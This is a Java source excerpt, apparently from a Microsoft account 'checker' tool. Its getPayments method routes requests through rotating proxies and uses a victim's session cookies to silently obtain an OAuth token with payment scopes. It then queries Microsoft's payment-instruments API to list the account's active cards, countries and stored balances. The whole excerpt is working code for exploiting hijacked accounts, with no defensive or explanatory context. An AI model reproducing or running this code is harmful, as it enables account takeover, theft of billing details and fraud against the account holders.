        if (enableProxiesChecker) {
            if (!microsoftChecker_GoodProxies.isEmpty()) {
                proxy1 = ProxyTester.MicrosoftModule_GetGoodProxy(microsoftChecker_GoodProxies);
            } else {
                proxy1 = ProxyTester.microsoftCheckerGetProxyAndCheckProxy(ProxyTester.proxies);
            }
        } else {
            proxy1 = ProxyTester.MicrosoftModule_GetRandomProxy(proxies1);
        }

        String[] proxy2;
        if (proxy1 != null) {
            proxy2 = proxy1.trim().split(":");
        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(null);
            } else {
                proxies1.remove(null);
            }

            return getPayments(cookies);
        }
        ProxyTester.updatedProxies = true;
        Proxy proxy;
        if (proxy2.length == 3) {
            proxy = new Proxy(Proxy.Type.valueOf(proxy2[2]), new InetSocketAddress(proxy2[0], Integer.parseInt(proxy2[1])));
        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(proxy1);
            } else {
                proxies1.remove(proxy1);
            }

            return getPayments(cookies);
        }
        StringBuilder stringBuilderG = new StringBuilder();
        try {
            String location;
            String accessToken;
            String url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bdfaf8bf5b1a2d63%22%2C%22scopeSet%22%3A%22pidl%22%2C%22returnUrl%22%3A%22https%3A%2F%2Faccount.microsoft.com%2Fbilling%2Fpayments%2F%22%7D"; // Ҫ����URL
            Connection connection = Jsoup.connect(url)
                    .timeout(20000)
                    .userAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0")
                    .header("Pragma", "no-cache")
                    .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                    .followRedirects(false)
                    .proxy(proxy)
                    .header("Cookie", cookies);
            Connection.Response response = connection.execute();
            location = response.header("Location");
            if (location != null) {
                accessToken = extractStringBetween(location, "access_token=", "&");
            } else {
                return null;
            }
            if (accessToken != null) {
                String url1 = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US";
                Connection connection1 = Jsoup.connect(url1)
                        .ignoreContentType(true)
                        .header("Authorization", "MSADELEGATE1.0=" + accessToken);
                Connection.Response response1 = connection1.execute();
                Document document = response1.parse();
                try {
                    ObjectMapper mapper = new ObjectMapper();
                    JsonNode rootNode = mapper.readTree(document.text());

                    for (JsonNode node : rootNode) {
                        String status = node.get("status").asText();
                        if (node.toString().contains("lastUpdatedDateTime") & status.equals("Active")) {
                            String paymentMethodType = node.get("paymentMethod").get("paymentMethodType").asText();
                            if (!paymentMethodType.equals("stored_value") & !paymentMethodType.equals("paypal")) {
                                String country = node.get("details").get("address").get("country").asText();
                                stringBuilderG.append(paymentMethodType).append("(").append(country).append("),");
                            } else if (paymentMethodType.equals("stored_value")) {
                                String balance = node.get("details").get("balance").asText();
                                if (Double.parseDouble(balance) > 0) {
                                    String currency = node.get("details").get("currency").asText();
                                    stringBuilderG.append(paymentMethodType).append("(").append(balance).append("[").append(currency).append("]),");
                                } else {
                                    stringBuilderG.append(paymentMethodType).append("(").append(balance).append("),");
                                }
                            } else {
                                stringBuilderG.append(paymentMethodType).append(",");
                            }
                        }
                        if (!stringBuilderG.isEmpty()){
                            return stringBuilderG;
                        }
                        return null;
                    }
                    return null;
                } catch (JsonProcessingException e) {
                    return new StringBuilder("false");
                }
            }
            return new StringBuilder("false");
        } catch (IOException e) {
            return new StringBuilder("false");
        }

    }

    public static String extractStringBetween(String input, String startMarker, String endMarker) {
        String pattern = Pattern.quote(startMarker) + "(.*?)" + Pattern.quote(endMarker);
        Matcher matcher = Pattern.compile(pattern).matcher(input);

        if (matcher.find()) {
            return matcher.group(1);
        }

        return null;
    }
}